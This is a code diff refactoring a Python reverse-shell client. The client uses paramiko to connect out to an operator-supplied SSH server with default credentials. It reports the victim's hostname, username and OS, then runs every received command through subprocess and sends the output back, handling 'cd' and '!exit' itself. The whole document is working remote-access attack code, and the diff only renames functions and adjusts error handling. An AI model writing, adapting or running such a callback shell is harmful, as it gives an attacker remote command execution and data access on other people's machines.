@@ -1,6 +1,5 @@
 import paramiko
 import subprocess
-import sys
 import os
 import socket
 import getpass
@@ -15,29 +14,25 @@ optional.add_argument("-p", dest="port", type=int, default=2222, help="Server po
 optional.add_argument("-u", dest="user", default="sshUser", help="User to authenticate (Default: sshUser)")
 optional.add_argument("-pwd", dest="password", default="sshPass", help="Password to authenticate (Default: sshPass)")
 
-if (len(sys.argv) == 1):
-    parser.print_help(sys.stdout)
-    sys.exit()
-
 args = parser.parse_args()
 
-def SSH_comm():
+def main():
     ip = args.ip #Server IP
     port = args.port #Server port
     username = args.user #Server username
     password = args.password #Server password
 
     try:
-        SSH = paramiko.SSHClient()
-        SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        SSH.connect(ip, port=port, username=username, password=password)
-        session = SSH.get_transport().open_session()
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(ip, port=port, username=username, password=password)
+        session = client.get_transport().open_session()
         host = socket.gethostname()
         user = getpass.getuser()
         type = os.name
     except Exception as ex:
-        print("[!] Unable to connect to server.")
-        sys.exit()
+        print("[!] Unable to connect to server. Use -h for help.")
+        exit()
 
     if session.active:
         session.sendall(f"{host},{user},{type}")
@@ -48,14 +43,13 @@ def SSH_comm():
                 head = command.split(" ")[0]
                 match head:
                     case "!exit":
-                        sys.exit()
+                        exit()
                     case "cd":
                         path = " ".join(command.split(" ")[1:])
                         os.chdir(path)
                         CWD = os.getcwd()
                         session.sendall(f"Changed directory to {CWD}\n")
                     case _:
-                        #output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                         output = subprocess.getoutput(command)
                         if (len(output) == 0):
                             session.sendall("[*] Command executed. No shell output.\n")
@@ -63,10 +57,6 @@ def SSH_comm():
                             session.sendall(output + "\n")
             except Exception as ex:
                 session.sendall("[!] " + str(ex) + "\n")
-    return
 
 if __name__ == "__main__":
-    try:
-        SSH_comm()
-    except Exception as ex:
-        print(str(ex))
+    main()
